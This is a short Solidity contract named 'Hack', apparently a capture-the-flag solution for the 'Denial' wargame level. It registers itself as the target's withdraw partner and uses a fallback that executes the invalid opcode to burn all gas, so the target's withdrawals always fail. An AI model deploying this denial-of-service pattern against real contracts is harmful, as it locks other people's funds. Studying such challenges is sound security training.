// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Denial} from "./Denial.sol";

contract Hack {
    constructor(Denial target_) {
        target_.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}
